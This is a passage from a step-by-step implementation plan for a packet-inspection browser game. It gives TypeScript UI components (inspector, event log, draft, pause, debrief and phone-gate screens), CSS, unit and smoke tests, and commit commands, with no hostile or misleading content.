    let html = `<div class="ptitle">${t('inspector.title')}${tags}<span>${t('inspector.src', { ip: p.src })}</span><span>${esc(loc(NETWORKS[p.t.net]))}</span><span>${t('inspector.lane', { lane: PORT[p.lane] })}</span></div>`;
    html += `<pre class="req">${mark(p.t.request.join('\n'), p.t.hints, hintsOn)}</pre>`;
    if (lens) html += `<div class="ctx">${t('inspector.decoded')} · ${mark(p.t.decoded!, p.t.decodedHints, hintsOn)}</div>`;
    if (p.t.context) html += `<div class="ctx">${mark(loc(p.t.context), p.t.hints, hintsOn)}</div>`;
    if (f.kind === 'verdict') {
      const fam = t(`family.${p.t.kind}`);
      const tier = p.t.kind === 'legit' ? (p.t.decoy ? ` · ${t('inspector.decoy')}` : '') : ` · ${'●'.repeat(p.t.tier!)}${'○'.repeat(3 - p.t.tier!)} ${t(`tier.${p.t.tier}`)}`;
      html += `<div class="verdict ${p.t.kind === 'legit' ? 'ok' : 'bad'}">${t('inspector.verdict', { family: fam })}${tier}</div><p class="why">${esc(loc(p.t.why))}</p>`;
    } else {
      html += `<div class="ask">${s?.locked === p.id ? t('inspector.askLocked') : t('inspector.ask')}</div>`;
    }
    this.box.innerHTML = html;
  }
}
```

- [ ] **Step 3: Event log**

`src/ui/eventLog.ts`:
```ts
// core
import { cardById } from '../core/content/cards';
import type { LogEntry, RunEvent } from '../core/events';
import type { Run } from '../core/run';

// game
import type { View } from '../game/view';

// i18n
import { loc, t } from '../i18n';

// local
import { el } from './dom';
import type { Inspector } from './inspector';

const GLYPH: Record<LogEntry['outcome'], string> = { hit: '✓', squire: '✓', rule: '✓', served: '●', neutralized: '◆', breach: '✗', fp: '☹' };
const CLS: Record<LogEntry['outcome'], string> = { hit: 'ok', squire: 'ok', rule: 'ok', served: 'ok', neutralized: 'ok', breach: 'bad', fp: 'fp' };

// Every outcome, newest first, scrollable, with a MISTAKES filter: where you went wrong stays findable.
export class EventLog implements View {
  private readonly rows: HTMLElement;
  private readonly title: HTMLElement;
  private readonly count: HTMLElement;
  private readonly all: HTMLButtonElement;
  private readonly mis: HTMLButtonElement;
  private run: Run | null = null;

  constructor(bottom: HTMLElement, private readonly inspector: Inspector) {
    const box = el('div', 'log', bottom);
    const head = el('div', 'ptitle', box);
    this.title = el('span', '', head, t('log.title'));
    this.title.style.color = 'var(--dim)';
    this.count = el('span', 'count', head, t('log.hint'));
    const f = el('span', 'lfilter', head);
    this.all = el('button', 'on', f, t('log.all'));
    this.mis = el('button', '', f, t('log.mistakes'));
    this.all.onclick = () => this.filter(false);
    this.mis.onclick = () => this.filter(true);
    this.rows = el('div', 'rows', box);
    box.addEventListener('mouseleave', () => inspector.leave());
  }

  private filter(mistakes: boolean): void {
    this.rows.classList.toggle('mistakes', mistakes);
    this.mis.classList.toggle('on', mistakes);
    this.all.classList.toggle('on', !mistakes);
  }

  private pts(e: LogEntry): string {
    switch (e.outcome) {
      case 'hit': return e.packet.t.tier && e.packet.t.tier > 1 ? `+${e.points} · ${t(`tier.${e.packet.t.tier}`)}` : `+${e.points}`;
      case 'rule': return `+${e.points} · ${loc(cardById(e.ruleId!).name)}`;
      case 'neutralized': return `+${e.points} · ${loc(cardById(e.ruleId!).name)}`;
      case 'served': return e.packet.t.decoy ? `+${e.points} · ${t('log.notFooled')}` : `+${e.points}`;
      case 'breach': return t('log.uptimeLoss', { n: e.damage ?? 0 });
      case 'fp': return e.fpBy === 'rule' ? t('log.by', { rule: loc(cardById(e.ruleId!).name) }) : e.fpBy === 'squire' ? t('log.squireHit') : t('log.youHit');
      default: return `+${e.points}`;
    }
  }

  private row(e: LogEntry): HTMLElement {
    const r = el('div', `row ${CLS[e.outcome]}`);
    el('span', 'wv', r, `W${e.wave}`);
    el('span', 'g', r, GLYPH[e.outcome]);
    el('span', 'what', r, t(`log.${e.outcome}`));
    el('span', 'pl', r, e.packet.t.card);
    el('span', 'pts', r, this.pts(e));
    r.addEventListener('mouseenter', () => this.inspector.verdict(e));
    return r;
  }

  private renderCount(): void {
    const log = this.run?.state.log ?? [];
    const m = log.filter((e) => e.outcome === 'breach' || e.outcome === 'fp').length;
    this.count.textContent = log.length ? t('log.count', { n: log.length, m }) : t('log.hint');
  }

  start(run: Run): void {
    this.run = run;
    this.rows.innerHTML = '';
    this.filter(false);
    this.renderCount();
  }

  refresh(): void {
    this.title.textContent = t('log.title');
    this.all.textContent = t('log.all');
    this.mis.textContent = t('log.mistakes');
    this.rows.innerHTML = '';
    for (const e of this.run?.state.log ?? []) this.rows.appendChild(this.row(e));
    this.renderCount();
  }

  event(ev: RunEvent, run: Run): void {
    if (ev.type !== 'log') return;
    this.run = run;
    const prev = this.rows.scrollTop, r = this.row(ev.entry);
    this.rows.prepend(r);
    while (this.rows.childElementCount > run.state.log.length) this.rows.lastElementChild!.remove();
    if (prev > 0) this.rows.scrollTop = prev + r.offsetHeight;
    this.renderCount();
  }
}
```

- [ ] **Step 4: Loadout tiles**

`src/ui/loadout.ts`:
```ts
// core
import { cardById, type CardId } from '../core/content/cards';
import type { RunEvent } from '../core/events';
import type { Run } from '../core/run';

// art
import { iconUrl } from '../art/dataurl';

// game
import type { View } from '../game/view';

// i18n
import { loc } from '../i18n';

// local
import { el } from './dom';
import type { Inspector } from './inspector';

const shown = (owned: CardId[]): CardId[] => owned.filter((id) => !(id === 'obs1' && (owned.includes('obs2') || owned.includes('obs3'))) && !(id === 'obs2' && owned.includes('obs3')));

export class LoadoutTiles implements View {
  private readonly box: HTMLElement;

  constructor(ui: HTMLElement, private readonly inspector: Inspector) {
    this.box = el('div', 'loadout', ui);
  }

  private render(owned: CardId[]): void {
    this.box.innerHTML = '';
    for (const id of shown(owned)) {
      const c = cardById(id);
      const tile = el('div', `ltile ${c.cat}`, this.box);
      tile.title = loc(c.name);
      const img = el('img', 'px', tile);
      img.src = iconUrl(c.icon, 'tile');
      img.alt = loc(c.name);
      tile.addEventListener('mouseenter', () => this.inspector.card(c));
      tile.addEventListener('mouseleave', () => this.inspector.leave());
    }
  }

  start(run: Run): void { this.render(run.state.owned); }
  refresh(run: Run | null): void { if (run) this.render(run.state.owned); }
  event(ev: RunEvent): void { if (ev.type === 'owned') this.render(ev.owned); }
}
```

- [ ] **Step 5: Wire in `src/main.ts`**

Before creating `PacketsView`, declare `let inspector: Inspector | null = null;` and change its `hover` intent to `hover: (p) => inspector?.hover(p)`. After the UI layer is created:
```ts
  const bottom = el('div', 'bottom', ui);
  inspector = new Inspector(bottom);
  app.add(inspector, new EventLog(bottom, inspector), new LoadoutTiles(ui, inspector));
```
with imports for `Inspector`, `EventLog`, `LoadoutTiles`.

- [ ] **Step 6: Smoke check `log`**

```js
  async log(page) {
    await page.waitForFunction(() => window.__nsp.app.run.state.log.length >= 8, null, { timeout: 40000 });
    const rows = await page.$$eval('#ui .rows .row', (a) => a.length);
    if (rows < 8) throw new Error(`only ${rows} log rows`);
    await page.hover('#ui .rows .row:first-child');
    await page.waitForSelector('#ui .ins .verdict');
    await page.click('#ui .lfilter button:nth-child(2)');
    await page.screenshot({ path: `${OUT}/log.png` });
    const scrollable = await page.$eval('#ui .rows', (e) => getComputedStyle(e).overflowY);
    if (scrollable !== 'auto') throw new Error('log not scrollable');
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs log hud`
Expected: PASS. In `smoke-out/log.png` the inspector shows a verdict (family, tier dots, the explanation) and the log is filtered to mistakes.

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "Add the inspector, the scrollable event log and loadout tiles" -m "Players can read any packet, see every verdict after the fact, filter the log down to their mistakes and hover an upgrade to recall what it does." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 18: Title, how-to, draft, pause, debrief and the phone gate

**Files:**
- Create: `src/ui/overlays.ts`, `src/ui/title.ts`, `src/ui/draftPanel.ts`, `src/ui/pausePanel.ts`, `src/ui/debrief.ts`, `src/ui/phoneGate.ts`
- Modify: `src/app.ts` (add draft and quit methods), `src/styles.css` (append), `src/main.ts` (phone gate, overlays, no auto-start), `scripts/smoke.mjs` (update `loop`, `packets`, `resizeAndClick`, `objects`, `hud`, `log` to start from the title; add `draft`, `debrief`, `phone`)

**Interfaces:**
- Consumes: `App`, `Run`, `RunEvent`, `resultOf`, `grade`, `shareText`, `breachTotal`, `PRICE`, `REROLL_COST`, `Store`, `iconUrl`, `t`, `loc`, `fmtNum`, `lang`, `setLang`, `el`, `EffectsView` (for the reduced-effects toggle).
- Produces:
  - `App.pick(i)`, `App.reroll()`, `App.nextWave()`, `App.quit()`.
  - `Overlays(ui, app, opts: { effects: EffectsView })`, which owns `app.onScreen` and `app.onEnd`.
  - `shouldGate(width: number, coarseOnly: boolean): boolean` and `renderPhoneGate(root: HTMLElement): void` in `phoneGate.ts`.

- [ ] **Step 1: App methods**

Add to the `App` class in `src/app.ts`:
```ts
  pick(i: number): void { if (this.run) this.dispatch(this.run.pick(i)); }
  reroll(): void { if (this.run) this.dispatch(this.run.reroll()); }
  nextWave(): void { if (this.run) this.dispatch(this.run.nextWave()); }

  // Back to the title: an idle run resets every view (no packets, cold rack, knight at his post)
  // so the field reads as a calm backdrop behind the semi-transparent title.
  quit(): void {
    const idle = new Run({ mode: 'campaign', seed: 1, root: this.root, hints: false });
    for (const v of this.views) v.start?.(idle);
    this.run = null;
    this.setScreen('title');
  }
```

- [ ] **Step 2: Append overlay styles to `src/styles.css`**

```css
/* ---------- overlays ---------- */
.ov { position: absolute; left: 0; top: 56px; width: 1280px; height: 664px; z-index: 40; background: rgba(22,22,22,.95); display: none; flex-direction: column; align-items: center; justify-content: center; gap: 12px; text-align: center; pointer-events: auto; }
.ov.show { display: flex; }
.ov.ov-title { top: 0; height: 720px; background: rgba(22,22,22,.82); }
.ov.ov-howto, .ov.ov-debrief { top: 0; height: 720px; background: rgba(22,22,22,.97); }
.ov h1 { font-size: 64px; letter-spacing: .12em; margin: 0; text-shadow: -4px 0 var(--r), 4px 0 var(--b); animation: jitter 4s infinite steps(1); }
.ov h2 { font-size: 30px; letter-spacing: .12em; margin: 0; text-shadow: -3px 0 var(--r), 3px 0 var(--b); }
.ov p { font-family: var(--body); font-size: 16px; color: var(--dim); margin: 0; max-width: 700px; line-height: 1.45; }
.ov q { font-size: 18px; }
.btn { font-family: var(--mono); font-size: 14px; font-weight: 700; letter-spacing: .06em; background: var(--ink); color: var(--paper); border: 1px solid var(--ink); padding: 8px 16px; cursor: pointer; }
.btn.ghost { background: transparent; color: var(--ink); }
.btn:disabled { opacity: .35; cursor: not-allowed; }
.btn:not(:disabled):hover { box-shadow: -3px 0 0 var(--r), 3px 0 0 var(--b); }
.row-btns { display: flex; gap: 12px; align-items: center; justify-content: center; flex-wrap: wrap; }
.note { font-size: 13px; color: var(--dim); }
.best { font-size: 13px; color: var(--dim); line-height: 1.7; }
.best b { color: var(--ink); }
.sitelink { font-size: 13px; color: var(--dim); text-decoration: none; border-bottom: 1px solid var(--mute); }
.howto-grid { display: grid; grid-template-columns: auto auto; gap: 8px 18px; text-align: left; font-family: var(--body); font-size: 15px; }
.howto-grid kbd { font-family: var(--mono); font-size: 13px; color: var(--ink); border: 1px solid var(--mute); padding: 1px 6px; justify-self: end; }

.draft-h { font-size: 14px; letter-spacing: .14em; }
.draft-h span { color: var(--gold); }
.cards { display: flex; gap: 16px; align-items: stretch; }
.ucard { width: 330px; background: var(--paper); border: 1px solid var(--dim); padding: 12px 14px 14px; text-align: left; display: flex; flex-direction: column; gap: 6px; }
.ucard.LEGENDARY { border-color: var(--r); box-shadow: -3px 0 0 var(--r), 3px 0 0 var(--b); }
.ucard.RARE { border-color: var(--b); }
.ucard.taken { opacity: .55; }
.uhead { display: flex; justify-content: space-between; font-size: 13px; }
.ucat { color: var(--dim); } .ucat.KNIGHT { color: var(--gold); } .ucat.FIREWALL { color: var(--b); }
.urar { padding: 0 6px; border: 1px solid var(--dim); color: var(--dim); }
.urar.RARE { border-color: var(--b); color: var(--b); }
.urar.LEGENDARY { border-color: var(--r); color: var(--ink); background: var(--r); animation: jitter 2.5s infinite steps(1); }
.uicon { height: 70px; display: flex; align-items: flex-end; justify-content: center; }
.uname { font-size: 17px; font-weight: 700; }
.udoes { font-family: var(--body); font-size: 14px; line-height: 1.38; margin: 0; }
.uirl, .ucatch { font-family: var(--body); font-size: 13px; line-height: 1.38; margin: 0; color: var(--dim); }
.uirl b { color: var(--b); font-family: var(--mono); font-size: 13px; } .ucatch b { color: var(--r); font-family: var(--mono); font-size: 13px; }
.ucard .btn { margin-top: auto; align-self: flex-start; }

.debrief { width: 1060px; display: grid; grid-template-columns: 340px 1fr; gap: 28px; text-align: left; }
.grade { font-size: 120px; font-weight: 700; line-height: 1; text-shadow: -5px 0 var(--r), 5px 0 var(--b); }
.statlist { font-size: 13px; color: var(--dim); line-height: 1.75; }
.statlist b { color: var(--ink); float: right; }
.mistakes { max-height: 330px; overflow-y: auto; scrollbar-width: thin; display: flex; flex-direction: column; gap: 8px; padding-right: 6px; }
.mistake { border-left: 3px solid var(--r); padding: 4px 10px; background: var(--sub); }
.mistake code { font-family: var(--code); font-size: 13px; color: var(--ink); word-break: break-all; }
.mistake p { font-size: 14px; color: var(--dim); max-width: none; margin: 2px 0 0; }
.newbest { color: var(--paper); background: var(--gold); padding: 0 6px; font-size: 13px; font-weight: 700; }
.share { font-family: var(--code); font-size: 13px; width: 100%; height: 54px; background: var(--soft); color: var(--ink); border: 1px solid var(--mute); resize: none; }

.gate { position: fixed; inset: 0; display: flex; flex-direction: column; justify-content: center; gap: 16px; padding: 24px 16px; background: var(--paper); font-family: var(--mono); }
.gate h1 { font-size: 30px; margin: 0; letter-spacing: .1em; text-shadow: -2px 0 var(--r), 2px 0 var(--b); }
.gate h2 { font-size: 20px; margin: 0; }
.gate p { font-family: var(--body); font-size: 16px; line-height: 1.5; color: var(--dim); margin: 0; }
.gate a { color: var(--dim); font-size: 14px; }
```

- [ ] **Step 3: Title and how-to**

`src/ui/title.ts`:
```ts
// i18n
import { fmtNum, t } from '../i18n';

// local
import type { Bests } from '../storage';
import { el } from './dom';

export interface TitleDeps {
  bests: Bests;
  root: boolean;
  play(): void;
  overtime(): void;
  howto(): void;
  toggleLang(): void;
}

export const renderTitle = (box: HTMLElement, d: TitleDeps): void => {
  box.innerHTML = '';
  el('h1', '', box, 'NONE SHALL PASS');
  el('p', '', box, t('title.tagline'));
  if (d.root) el('div', 'badge-root', box, t('title.rootOn'));
  const btns = el('div', 'row-btns', box);
  const play = el('button', 'btn', btns, t('title.play'));
  play.onclick = d.play;
  const ot = el('button', 'btn ghost', btns, t('title.overtime'));
  ot.disabled = !d.bests.won;
  ot.onclick = d.overtime;
  const how = el('button', 'btn ghost', btns, t('title.howto'));
  how.onclick = d.howto;
  const langBtn = el('button', 'btn ghost', btns, t('lang.toggle'));
  langBtn.onclick = d.toggleLang;
  if (!d.bests.won) el('div', 'note', box, `${t('title.overtime')}: ${t('title.overtimeLocked')}`);
  const slot = d.root ? 'root' : 'normal';
  const c = d.bests.campaign[slot], o = d.bests.overtime[slot];
  if (c || o) {
    const best = el('div', 'best', box);
    best.append(el('b', '', undefined, `${t('title.best')} `));
    if (c) best.append(el('div', '', undefined, t('title.bestCampaign', { g: c.grade, s: fmtNum(c.score) })));
    if (o) best.append(el('div', '', undefined, t('title.bestOvertime', { w: o.wave, s: fmtNum(o.score) })));
  }
  const a = el('a', 'sitelink', box, t('title.site'));
  a.href = 'https://jorius.github.io/';
};

export const renderHowto = (box: HTMLElement, back: () => void): void => {
  box.innerHTML = '';
  el('h2', '', box, t('howto.title'));
  const grid = el('div', 'howto-grid', box);
  const rows: [string, string][] = [['↑ ↓', 'howto.k1'], ['Tab', 'howto.k2'], ['Space', 'howto.k3'], ['Esc', 'howto.k4'], ['click', 'howto.k5'], ['H', 'howto.k6'], ['P', 'howto.k7']];
  for (const [k, key] of rows) { el('kbd', '', grid, k); el('span', '', grid, t(key)); }
  el('p', '', box, t('howto.lesson'));
  const b = el('button', 'btn', box, t('howto.back'));
  b.onclick = back;
};
```

- [ ] **Step 4: Draft panel**

`src/ui/draftPanel.ts`:
```ts
// core
import { PRICE, REROLL_COST } from '../core/draft';
import type { Run } from '../core/run';

// art
import { iconUrl } from '../art/dataurl';

// i18n
import { fmtNum, loc, t } from '../i18n';

// local
import { el } from './dom';

export const renderDraft = (box: HTMLElement, run: Run, act: { pick(i: number): void; reroll(): void; next(): void }): void => {
  const s = run.state, d = s.draft;
  box.innerHTML = '';
  if (!d) return;
  el('h2', '', box, t('draft.waveClear', { n: s.wave }));
  el('p', '', box, t('draft.stats', { u: s.uptime, r: s.rep, c: fmtNum(s.credits) }));
  const head = el('div', 'draft-h', box, `${t('draft.choose')} · `);
  el('span', '', head, d.free ? t('draft.freeNote') : t('draft.buyNote'));
  const cards = el('div', 'cards', box);
  d.picks.forEach((c, i) => {
    const taken = d.taken.includes(c.id);
    const card = el('div', `ucard ${c.rarity}${taken ? ' taken' : ''}`, cards);
    const h = el('div', 'uhead', card);
    el('span', `ucat ${c.cat}`, h, `${{ KNIGHT: '♞', FIREWALL: '▦', SERVER: '◆' }[c.cat]} ${t(`draft.cat.${c.cat}`)}`);
    el('span', `urar ${c.rarity}`, h, t(`draft.rarity.${c.rarity}`));
    const icon = el('div', 'uicon', card);
    const img = el('img', 'px', icon);
    img.src = iconUrl(c.icon, 'card');
    img.alt = '';
    el('div', 'uname', card, loc(c.name));
    el('p', 'udoes', card, loc(c.does));
    const irl = el('p', 'uirl', card);
    irl.append(el('b', '', undefined, t('inspector.irl')), ` ${loc(c.irl)}`);
    const cat = el('p', 'ucatch', card);
    cat.append(el('b', '', undefined, t('inspector.catch')), ` ${loc(c.catch)}`);
    const price = PRICE[c.rarity];
    const btn = el('button', taken || !d.free ? 'btn ghost' : 'btn', card,
      taken ? t('draft.taken') : d.free ? t('draft.take') : t('draft.buy', { n: fmtNum(price) }));
    btn.disabled = taken || (!d.free && s.credits < price);
    btn.onclick = () => { btn.disabled = true; act.pick(i); };
  });
  const foot = el('div', 'row-btns', box);
  const rr = el('button', 'btn ghost', foot, t('draft.reroll', { n: REROLL_COST }));
  rr.disabled = s.credits < REROLL_COST;
  rr.onclick = () => { rr.disabled = true; act.reroll(); };
  const next = el('button', 'btn', foot, t('draft.next'));
  next.onclick = () => { next.disabled = true; act.next(); };
};
```

The buttons disable themselves on click before acting, and the core refuses double takes and debt anyway (Task 8), so mashing cannot buy twice.

- [ ] **Step 5: Pause panel and debrief**

`src/ui/pausePanel.ts`:
```ts
// i18n
import { t } from '../i18n';

// local
import { el } from './dom';

export const renderPause = (box: HTMLElement, d: { reduced: boolean; resume(): void; quit(): void; toggleLang(): void; toggleReduced(): void }): void => {
  box.innerHTML = '';
  el('h2', '', box, t('pause.title'));
  el('p', '', box, t('pause.hint'));
  const row = el('div', 'row-btns', box);
  el('button', 'btn', row, t('pause.resume')).onclick = d.resume;
  el('button', 'btn ghost', row, t('pause.quit')).onclick = d.quit;
  el('button', 'btn ghost', row, t('lang.toggle')).onclick = d.toggleLang;
  el('button', 'btn ghost', row, d.reduced ? t('pause.reducedOn') : t('pause.reducedOff')).onclick = d.toggleReduced;
};
```

`src/ui/debrief.ts`:
```ts
// core
import { grade, shareText, type RunResult } from '../core/score';
import { breachTotal, type RunState } from '../core/state';

// i18n
import { fmtNum, lang, loc, t } from '../i18n';

// local
import { el } from './dom';

export const renderDebrief = (box: HTMLElement, s: RunState, r: RunResult, newBest: boolean, act: { again(): void; title(): void }): void => {
  box.innerHTML = '';
  const head = r.won ? t('debrief.won') : r.mode === 'overtime' ? t('debrief.overtimeOver') : r.reason === 'usersGone' ? t('debrief.usersGone') : t('debrief.serverDown');
  el('h2', '', box, head);
  const wrap = el('div', 'debrief', box);
  const left = el('div', '', wrap);
  const g = grade(r);
  if (g) { el('div', 'note', left, t('debrief.grade')); el('div', 'grade', left, g); }
  else { el('div', 'note', left, t('debrief.waves')); el('div', 'grade', left, String(r.wavesCleared)); }
  const sc = el('div', 'best', left);
  sc.append(el('b', '', undefined, `${t('debrief.score')} ${fmtNum(r.score)}`));
  if (newBest && !r.tampered) sc.append(' ', el('span', 'newbest', undefined, t('debrief.newBest')));
  if (r.tampered) el('div', 'note', left, t('debrief.tampered'));
  const st = r.stats;
  const list = el('div', 'statlist', left);
  const line = (k: string, v: string) => { const d = el('div', '', list, t(k)); d.append(el('b', '', undefined, v)); };
  line('debrief.hits', `${st.hits[1]} / ${st.hits[2]} / ${st.hits[3]}`);
  line('debrief.decoys', String(st.decoysKept));
  line('debrief.squire', String(st.squireHits));
  line('debrief.rules', String(st.ruleBlocks));
  line('debrief.served', String(st.served));
  line('debrief.neutralized', String(st.neutralized));
  line('debrief.fps', String(st.falsePositives));
  line('debrief.breaches', String(breachTotal(st)));
  line('debrief.uptime', `${r.uptime}%`);
  const right = el('div', '', wrap);
  el('div', 'draft-h', right, t('debrief.mistakes'));
  const mistakes = s.log.filter((e) => e.outcome === 'breach' || e.outcome === 'fp');
  const ml = el('div', 'mistakes', right);
  if (!mistakes.length) el('p', '', ml, t('debrief.noMistakes'));
  for (const e of mistakes.slice(0, 30)) {
    const m = el('div', 'mistake', ml);
    el('code', '', m, `W${e.wave} · ${t(`log.${e.outcome}`)} · ${e.packet.t.card}`);
    el('p', '', m, loc(e.packet.t.why));
  }
  const text = shareText(r, lang());
  const ta = el('textarea', 'share', right);
  ta.readOnly = true;
  ta.value = text;
  const row = el('div', 'row-btns', box);
  const copy = el('button', 'btn', row, t('debrief.copy'));
  copy.onclick = () => {
    const done = (): void => { copy.textContent = t('debrief.copied'); };
    const fallback = (): void => { ta.select(); done(); };
    if (navigator.clipboard) navigator.clipboard.writeText(text).then(done, fallback); else fallback();
  };
  el('button', 'btn ghost', row, t('debrief.again')).onclick = act.again;
  el('button', 'btn ghost', row, t('debrief.toTitle')).onclick = act.title;
};
```

- [ ] **Step 6: Overlays controller**

`src/ui/overlays.ts`:
```ts
// core
import type { Mode } from '../core/content/waves';
import type { RunEvent } from '../core/events';
import type { Screen } from '../core/keys';
import type { Run } from '../core/run';
import { resultOf } from '../core/score';

// game
import type { View } from '../game/view';
import type { EffectsView } from '../game/views/effects';

// i18n
import { lang, setLang } from '../i18n';

// local
import type { App } from '../app';
import { renderDebrief } from './debrief';
import { el } from './dom';
import { renderDraft } from './draftPanel';
import { renderPause } from './pausePanel';
import { renderHowto, renderTitle } from './title';

type Kind = 'none' | 'title' | 'howto' | 'draft' | 'pause' | 'debrief';

export class Overlays implements View {
  private readonly box: HTMLElement;
  private kind: Kind = 'none';
  private lastMode: Mode = 'campaign';
  private ended: { run: Run; newBest: boolean } | null = null;

  constructor(private readonly ui: HTMLElement, private readonly app: App, private readonly opts: { effects: EffectsView }) {
    this.box = el('div', 'ov', ui);
    app.onScreen = (s) => this.onScreen(s);
    app.onEnd = (run) => {
      const r = resultOf(run.state);
      const { newBest } = app.store.recordResult(r);
      this.ended = { run, newBest };
      this.show('debrief');
    };
  }

  private onScreen(s: Screen): void {
    if (s === 'title') this.show('title');
    else if (s === 'draft') this.show('draft');
    else if (s === 'paused') this.show('pause');
    else if (s === 'playing' || s === 'console') this.hide();
  }

  private show(kind: Kind): void {
    this.kind = kind;
    this.box.className = `ov show ov-${kind}`;
    this.render();
  }

  private hide(): void {
    this.kind = 'none';
    this.box.className = 'ov';
    this.box.innerHTML = '';
  }

  private toggleLang = (): void => {
    const next = lang() === 'en' ? 'es' : 'en';
    this.app.store.setPrefs({ lang: next });
    setLang(next);
  };

  private start = (mode: Mode): void => {
    this.lastMode = mode;
    this.app.startRun(mode);
  };

  refresh(): void {
    if (this.kind !== 'none') this.render();
  }

  event(ev: RunEvent): void {
    if (this.kind === 'draft' && (ev.type === 'draftChanged' || ev.type === 'uptime' || ev.type === 'owned')) this.render();
  }

  private render(): void {
    const a = this.app;
    switch (this.kind) {
      case 'title':
        renderTitle(this.box, { bests: a.store.bests(), root: a.root, play: () => this.start('campaign'), overtime: () => this.start('overtime'), howto: () => this.show('howto'), toggleLang: this.toggleLang });
        break;
      case 'howto':
        renderHowto(this.box, () => this.show('title'));
        break;
      case 'draft':
        if (a.run) renderDraft(this.box, a.run, { pick: (i) => a.pick(i), reroll: () => a.reroll(), next: () => a.nextWave() });
        break;
      case 'pause':
        renderPause(this.box, {
          reduced: this.opts.effects.reduced,
          resume: () => a.setScreen('playing'),
          quit: () => a.quit(),
          toggleLang: this.toggleLang,
          toggleReduced: () => {
            this.opts.effects.reduced = !this.opts.effects.reduced;
            a.store.setPrefs({ reducedFx: this.opts.effects.reduced });
            this.ui.classList.toggle('reduced', this.opts.effects.reduced);
            this.render();
          },
        });
        break;
      case 'debrief':
        if (this.ended) renderDebrief(this.box, this.ended.run.state, resultOf(this.ended.run.state), this.ended.newBest, { again: () => this.start(this.lastMode), title: () => a.quit() });
        break;
      default:
        break;
    }
  }
}
```

Reduced effects also tame the CSS glitches: append to `src/styles.css`:
```css
#ui.reduced .title, #ui.reduced h1, #ui.reduced .urar.LEGENDARY { animation: none; }
#ui.reduced .hpstrip.hit { animation-duration: .2s; }
#ui.reduced .scanlines { display: none; }
```

- [ ] **Step 7: Phone gate**

`src/ui/phoneGate.ts`:
```ts
// i18n
import { t } from '../i18n';

// local
import { el } from './dom';

export const shouldGate = (width: number, coarseOnly: boolean): boolean => width < 900 || coarseOnly;

export const renderPhoneGate = (root: HTMLElement): void => {
  root.innerHTML = '';
  const g = el('div', 'gate', root);
  el('h1', '', g, 'NONE SHALL PASS');
  el('h2', '', g, t('phone.title'));
  el('p', '', g, t('phone.body'));
  const b = el('button', 'btn', g, t('phone.copy'));
  b.onclick = () => { void navigator.clipboard?.writeText(location.href).then(() => { b.textContent = t('phone.copied'); }); };
  const a = el('a', '', g, t('title.site'));
  a.href = 'https://jorius.github.io/';
};
```

Add a test for `shouldGate` in `src/ui/phoneGate.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// local
import { shouldGate } from './phoneGate';

describe('shouldGate', () => {
  it('gates narrow screens and touch-only devices', () => {
    expect(shouldGate(390, false)).toBe(true);
    expect(shouldGate(1366, true)).toBe(true);
    expect(shouldGate(1366, false)).toBe(false);
  });
});
```

(`phoneGate.ts` imports `src/i18n`, which only touches `document`/`navigator` inside functions, so the test runs in the node environment.)

- [ ] **Step 8: Main: gate first, then the title**

In `src/main.ts`, at the top of `boot()` after loading fonts and creating the store/lang:
```ts
  const coarseOnly = window.matchMedia('(pointer: coarse)').matches && !window.matchMedia('(pointer: fine)').matches;
  if (shouldGate(window.innerWidth, coarseOnly)) { renderPhoneGate(document.getElementById('app')!); return; }
```
After all views are added, replace `app.startRun('campaign');` with:
```ts
  app.add(new Overlays(ui, app, { effects }));
  ui.classList.toggle('reduced', effects.reduced);
  app.quit();
```
with imports for `Overlays`, `renderPhoneGate`, `shouldGate`.

- [ ] **Step 9: Smoke checks start from the title**

In `scripts/smoke.mjs`, add a helper above `CHECKS` and call it first in `loop`, `packets`, `resizeAndClick`, `objects`, `hud` and `log`:
```js
const play = async (page, mode = 'campaign') => {
  await page.waitForSelector('#ui .ov-title .btn');
  await page.click(mode === 'campaign' ? '#ui .ov-title .row-btns .btn:nth-child(1)' : '#ui .ov-title .row-btns .btn:nth-child(2)');
  await page.waitForFunction(() => window.__nsp.app.screen === 'playing');
};
```

Add the new checks:
```js
  async draft(page) {
    await play(page);
    await page.evaluate(() => { const a = window.__nsp.app; a.dispatch(a.run.cheat('skip')); });
    await page.waitForSelector('#ui .ov-draft .ucard');
    await page.screenshot({ path: `${OUT}/draft.png` });
    const free = await page.$$eval('#ui .ucard .btn', (b) => b.map((x) => x.textContent));
    if (!free.some((x) => /FREE|GRATIS/.test(x))) throw new Error('no free pick');
    await page.click('#ui .ucard:first-child .btn');
    await page.waitForFunction(() => window.__nsp.app.run.state.owned.length === 2);
    await page.click('#ui .ov-draft .row-btns .btn:last-child');
    await page.waitForFunction(() => window.__nsp.app.screen === 'playing' && window.__nsp.app.run.state.wave === 2);
  },
  async debrief(page) {
    await play(page);
    // Without port lockdown the recon scans breach, and at 1% uptime the first breach ends the run.
    await page.evaluate(() => { const a = window.__nsp.app; a.run.state.owned = []; a.run.state.uptime = 1; });
    await page.waitForSelector('#ui .ov-debrief .grade', { timeout: 60000 });
    await page.screenshot({ path: `${OUT}/debrief.png` });
    const share = await page.$eval('#ui .share', (e) => e.value);
    if (!share.includes('jorius.github.io/none-shall-pass')) throw new Error('share text missing link');
  },
  async phone(page) {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.reload({ waitUntil: 'networkidle' });
    await page.waitForSelector('.gate h2');
    await page.screenshot({ path: `${OUT}/phone.png` });
    if (await page.$('#stage canvas')) throw new Error('game booted on a phone');
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs`
Expected: every check PASS. Review the screenshots: `draft.png` (three cards, first free, icons crisp), `debrief.png` (big grade F or the waves count, stats, mistakes with explanations, share text), `phone.png` (the keyboard card).

- [ ] **Step 10: Commit**

```bash
git add -A
git commit -m "Add the title, draft, pause and debrief screens and the phone gate" -m "The run now has its full shape: a title that unlocks Overtime after a win, the rogue-lite draft between waves, a pause menu with language and reduced effects, and a debrief that grades, lists mistakes and copies a share line." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 19: The hidden console and Konami root mode

**Files:**
- Create: `src/ui/consoleView.ts`, `src/game/views/rootMode.ts`
- Modify: `src/app.ts` (Konami on the title, `onRoot` hook), `src/styles.css` (append), `src/main.ts` (register), `src/game/views/fireWall.ts` (export `FIRE_AMBER`), `scripts/smoke.mjs` (add `console` and `konami` checks)

**Interfaces:**
